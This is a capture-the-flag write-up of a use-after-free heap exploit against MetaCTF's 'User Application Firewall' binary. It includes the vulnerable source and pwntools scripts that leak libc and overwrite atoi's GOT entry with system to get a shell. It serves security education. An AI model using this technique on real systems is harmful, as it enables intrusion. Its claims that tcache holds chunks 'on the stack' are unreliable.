# User Application Firewall

## Description

> Created by MetaCTF
>
> Our penetration testing team is just one server away from getting access to all of C3's networks! This one's proving to be very tough, as the only thing that's running is their User Application Firewall. The company claims this service is hardened against any buffer overflow and other stack-based vulnerabilities. They even give you the [compiled binary](https://metaproblems.com/858e22bc6f063b6e6738ec48289778b3/uaf), their [source code](https://metaproblems.com/858e22bc6f063b6e6738ec48289778b3/uaf.c) and [libc](https://metaproblems.com/858e22bc6f063b6e6738ec48289778b3/libc.so.6) that they used to run this service! Can you break in?
>
> Connect to `host1.metaproblems.com 5600` to see if you can gain access to the system! This service is running on Ubuntu 18.04.
>
> NOTE: This flag's format is MetaCTF{}

{% file src="../../../.gitbook/assets/uaf" %}

{% file src="../../../.gitbook/assets/uaf.c" %}

{% file src="../../../.gitbook/assets/libc.so.6" %}

## TL;DR

* Leak libc address from unsorted bin using UAF
* Overwrite GOT using UAF

## Solution

### Analysis

<details>

<summary>uaf.c</summary>

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>


char * rules[32];
int freed[32];

int created = 0;

void handler() {
	puts("Your session has expired.");
	exit(-1);
}


void menu() {
	puts("---Choose your option:---");
	puts("1. Create a firewall rule");
	puts("2. View a firewall rule");
	puts("3. Edit a firewall rule");
	puts("4. Delete a firewall rule");
	puts("5. Exit");
}

void create() {
	if(created >= 32) {
		puts("You have reached the max number of firewall rules.");
		return;
	}
	int index;
	for(index = 0; index < 32; index++) {
		if(rules[index] == 0 || freed[index] != 0) {
			break;
		}
	}
	rules[index] = malloc(255);
	puts("Firewall rule set. Enter your firewall rule here:");
	read(0, rules[index], 255);
	printf("Your firewall rule ID is: %d\n", index);
	freed[index] = 0;
	created++;
}

void view() {
	char val[8] = {0};
	int index;
	int choice = -1;
	for(index = 0; index < 32; index++) {
		if(rules[index] == 0) {
			break;
		}
	}
	while(choice < 0 || choice >= index) {
		puts("Enter the firewall ID which you want to view:");
		fgets(val, 8, stdin);
		choice = atoi(val);
		if(choice < 0 || choice >= index) {
			puts("Unknown firewall rule ID.");
			return;
		} 
	}
	printf("Your rule: %s\n", rules[choice]);
}

void edit() {
	char val[8] = {0};
	int index;
	int choice = -1;
        for(index = 0; index < 32; index++) {
                if(rules[index] == 0) {
                        break;
                }
        }
        while(choice < 0 || choice >= index) {
                puts("Enter the firewall ID which you want to edit:");
                fgets(val, 8, stdin);
                choice = atoi(val);
                if(choice < 0 || choice >= index) {
                        puts("Unknown firewall rule ID.");
			return;
                }
        }
	puts("Edit your new firewall rule here:");
	read(0, rules[choice], 255);
	puts("Your firewall rule has been updated");
}

void del() {
        char val[8] = {0};
        int index;
        int choice = -1;
        for(index = 0; index < 32; index++) {
                if(rules[index] == 0 || freed[index] != 0) {
                        break;
                }
        }
        while(choice < 0 || choice >= index || freed[choice] != 0) {
                puts("Enter the firewall ID which you want to delete:");
                fgets(val, 8, stdin);
                choice = atoi(val);
                if(choice < 0 || choice >= index || freed[choice] != 0) {
                        puts("Unknown firewall rule ID.");
			return;
                }
        }
	free(rules[choice]);
	freed[choice] = 1;
	puts("Rule deleted");
	created--;

}
void bye() {
	puts("Thanks for using the User Application Firewall!");
	exit(0);
}

int main() {
	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);
	signal(SIGALRM, handler);
	alarm(60);
	puts("Welcome to our User Application Firewall (UAF)!");
	unsigned int option;
	char val[8] = { 0 };
	while (1) {
		menu();
		printf("> ");
		fgets(val, 8, stdin);
		option = atoi(val);
		switch(option) {
			case 1:
				create();
				break;
			case 2:
				view();
				break;
			case 3:
				edit();
				break;
			case 4:
				del();
				break;
			case 5:
				bye();
				break;
			default:
				puts("Invalid option!");
				break;
		}
	}
}


```

</details>

Looking at the binary source code `uaf.c`, there are 4 main functions, namely `create`, `view`, `edit`, and `delete`.\
From these functions together with the challenge name, we can determine that this is a generic heap exploitation challenge.

The UAF abbreviation in the challenge title hints towards the <mark style="color:green;">Use-After-Free</mark> vulnerability.

In the `del` function, we can specify a rule index and the function will free() the chunk.

<pre class="language-c"><code class="lang-c">    ...
<strong>    free(rules[choice]);
</strong>    freed[choice] = 1;
<strong>    ...
</strong></code></pre>

Notice how after freeing the chunk, the `rules[choice]` isn't set to `null`.

{% hint style="info" %}
"To avoid reusing the pointer to a block that has already been freed, it's a good practice to set it to NULL immediately after freeing it."
{% endhint %}

After freeing a chunk, the chunk would contain the **fwd** and **bck** pointers. These pointers are addresses to chunks and if we are able to read them, we might be able to leak some addresses.

{% hint style="info" %}
**fwd pointer**: An address that points to where a free chunk is located and can be used. Usually would be the address of the previously freed chunk.

**bck pointer**: An address that points to the number of freed chunks available.
{% endhint %}

Looking at the `view` and `edit` functions, we find the Use-After-Free vulnerability as a result of the poor checks in place.

```c
	...
	for(index = 0; index < 32; index++) {
		if(rules[index] == 0) {
			break;
		}
	}
	...
```

As the rules get freed from the `del` function, it doesn't contain a `null` byte, but it contains the **fwd** and **bck** pointers. So it doesn't break even if it reaches a freed block.

Now that we have a Use-After-Free vuln in `view`, we can get an address leak.

### Leaking Libc Address

The leaking of addresses cannot be done simply by freeing a chunk and viewing the chunk. This is because the freed chunk would be freed into **tcache**, which stores the freed chunks on the stack. So if we view the chunk, it would not return a libc address but instead the stack address.

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption><p>heap view in GDB (see freed chunks in tache)</p></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (7) (3).png" alt=""><figcaption><p>chunks viewed in GDB</p></figcaption></figure>

We can see that the chunks are indeed stored in **tcache** and the addresses are stack addresses, not libc addresses.

To leak a libc address, we can try to leak from the **unsorted bin**. Note that **tcache bin** only stores up to **7** chunks. Additional chunks that are freed will then go into **unsorted bin**.

So we can **allocate 8** chunks, **free** those **8** chunks. then **view** the <mark style="color:red;">latest</mark> chunk that was freed.

```python
#!/usr/bin/env python3

from pwn import *

def option(m):
	global p
	p.sendlineafter(b'> ',m)

def create(m):
	global p
	option(b'1')
	p.recvline()
	p.clean()
	p.sendline(m)
	p.recvuntil(b'Your firewall rule ID is: ')
	return p.recvline().strip()

def view(i):
	global p
	option(b'2')
	p.recvline()
	p.clean()
	p.sendline(i)
	p.recvuntil(b'Your rule: ')
	return p.recvline()[:-1]

def edit(i,m):
	global p
	option(b'3')
	p.recvuntil(b'you want to edit:\n')
	p.clean()
	p.sendline(i)
	p.recvuntil(b'new firewall rule here:\n')
	p.clean()
	p.sendline(m)

def delete(i):
	global p
	option(b'4')
	p.recvuntil(b'you want to delete:\n')
	p.clean()
	p.sendline(i)
	return p.recvline()


elf = context.binary = ELF('./uaf_patched')
libc = ELF('./libc.so.6')
url,port = 'host1.metaproblems.com',5600

if args.REMOTE:
	p = remote(url,port)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p)

for _ in range(8):
	print('creating',_)
	create(b'test')
for i in range(7,-1,-1):
	print('deleting',i)
	delete(str(i).encode())

leak = view(b'0')
leak = u64(leak.ljust(8,b'\x00'))
print(hex(leak))

p.interactive()
p.close()
```

<figure><img src="../../../.gitbook/assets/image (2) (1) (2).png" alt=""><figcaption><p>leaked libc address</p></figcaption></figure>

Now that we have a libc leak, we can calculate the libc base and get the address of the `system` function in libc.

### Overwriting GOT

Remember that we also have a Use-After-Free vuln in `edit`. This means that we can **modify** the **fwd** pointer of **tcache** to wherever we want (as long as it is writable), **create** a new chunk with malloc(), then malloc will allocate the chunk at that address we specified.\
Now we have an arbitrary write.

Looking at the source code under the `main` function, our user input gets passed as an argument into the `atoi` function.\
We can overwrite the GOT of `atoi` with our libc `system` function, then pass in "/bin/sh" as our menu option to get RCE.

{% tabs %}
{% tab title="solve.py" %}
```python
#!/usr/bin/env python3

from pwn import *

def option(m):
	global p
	p.sendlineafter(b'> ',m)

def create(m):
	global p
	option(b'1')
	p.recvline()
	p.clean()
	p.sendline(m)
	p.recvuntil(b'Your firewall rule ID is: ')
	return p.recvline().strip()

def view(i):
	global p
	option(b'2')
	p.recvline()
	p.clean()
	p.sendline(i)
	p.recvuntil(b'Your rule: ')
	return p.recvline()[:-1]

def edit(i,m):
	global p
	option(b'3')
	p.recvuntil(b'you want to edit:\n')
	p.clean()
	p.sendline(i)
	p.recvuntil(b'new firewall rule here:\n')
	p.clean()
	p.sendline(m)

def delete(i):
	global p
	option(b'4')
	p.recvuntil(b'you want to delete:\n')
	p.clean()
	p.sendline(i)
	return p.recvline()


elf = context.binary = ELF('./uaf_patched')
libc = ELF('./libc.so.6')
url,port = 'host1.metaproblems.com',5600

if args.REMOTE:
	p = remote(url,port)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p)

atoi_got = 0x404068

for _ in range(8):
	print('creating',_)
	create(b'test')
for i in range(7,-1,-1):
	print('deleting',i)
	delete(str(i).encode())

leak = view(b'0')
leak = u64(leak.ljust(8,b'\x00'))
offset = 0x7fc1feb0dca0-0x7fc1fe722000
libc.address = leak-offset
print(hex(leak))

edit(b'1',p64(atoi_got))
create(b'test')
create(p64(libc.sym['system']))
option(b'/bin/sh')


p.interactive()
p.close()
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
If you are testing locally, make sure to patch your binary to use the libc.so.6 given!
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption><p>win</p></figcaption></figure>
